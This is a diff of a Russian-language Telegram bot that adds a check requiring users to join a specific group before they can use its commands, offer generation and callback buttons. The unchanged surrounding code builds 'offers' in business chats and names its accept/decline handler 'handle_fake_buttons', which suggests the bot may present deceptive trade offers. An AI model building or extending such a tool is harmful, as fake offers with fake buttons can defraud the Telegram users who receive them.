@@ -22,6 +22,13 @@ except ValueError:
 
 DEFAULT_TARGET = "Gifts_Replayer"
 
+# --- НАСТРОЙКИ ПРОВЕРКИ (ГРУППА) ---
+# ВАЖНО: Замените на числовой ID вашей группы (начинается с -100...)
+# Узнать ID: перешлите сообщение из группы боту @userinfobot
+TARGET_CHAT_ID = -1003747516067 
+INVITE_LINK = "https://t.me/+7WMVJ9ajTHU2NDFi"
+# ------------------------------------
+
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
@@ -69,6 +76,15 @@ MESSAGES = {
 def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
+
+# --- ФУНКЦИЯ ПРОВЕРКИ ПОДПИСКИ (ГРУППА) ---
+async def is_subscribed(user_id: int) -> bool:
+    try:
+        member = await bot.get_chat_member(chat_id=TARGET_CHAT_ID, user_id=user_id)
+        return member.status in ["member", "administrator", "creator"]
+    except Exception as e:
+        print(f"Ошибка проверки подписки (убедитесь, что бот админ в группе): {e}")
+        return False
 
 # --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
 async def get_gist_data():
@@ -179,6 +195,18 @@ async def cmd_test_db(message: types.Message):
 # --- ОСНОВНЫЕ КОМАНДЫ ---
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
+    # ПРОВЕРКА ПОДПИСКИ НА ГРУППУ
+    if not await is_subscribed(message.from_user.id):
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)
+        ]])
+        return await message.answer(
+            "⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>\n\n"
+            "Вступите в группу и отправьте /start снова.",
+            reply_markup=keyboard,
+            parse_mode="HTML"
+        )
+
     text = (
         "<b>Как начать:</b>\n"
         "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
@@ -196,17 +224,41 @@ async def cmd_start(message: types.Message):
 
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
+    if not await is_subscribed(message.from_user.id):
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)
+        ]])
+        return await message.answer(
+            "⚠️ <b>Сначала вступите в нашу группу!</b>", 
+            reply_markup=keyboard, 
+            parse_mode="HTML"
+        )
+    
     await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")
 
 @dp.message(F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- ГЕНЕРАЦИЯ ОФФЕРА (УМНЫЙ ПАРСЕР) ---
+# --- ГЕНЕРАЦИЯ ОФФЕРА ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
     if not business_connection_id: return
+
+    # ПРОВЕРКА ПОДПИСКИ ПЕРЕД ОФФЕРОМ
+    if not await is_subscribed(message.from_user.id):
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(text="Вступить в группу", url=INVITE_LINK)
+        ]])
+        await bot.send_message(
+            chat_id=message.chat.id,
+            text="⚠️ <b>Для использования бота вы должны состоять в нашей группе.</b>\n\nВступите и попробуйте снова.",
+            reply_markup=keyboard,
+            business_connection_id=business_connection_id,
+            parse_mode="HTML"
+        )
+        return
 
     parts = message.text.split()
     if len(parts) < 3: return
@@ -219,7 +271,6 @@ async def handle_offer_command(message: types.Message):
     except ValueError:
         return
     
-    # Умный парсер: ищем валюту и язык где угодно после цены
     currency = "stars"
     lang = "ru"
     
@@ -268,6 +319,10 @@ async def handle_offer_command(message: types.Message):
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
+    
+    if not await is_subscribed(callback.from_user.id):
+        await callback.answer("Вы не состоите в группе! Вступите, чтобы продолжить.", show_alert=True)
+        return
     
     data_parts = callback.data.split(":")
     if len(data_parts) != 5:
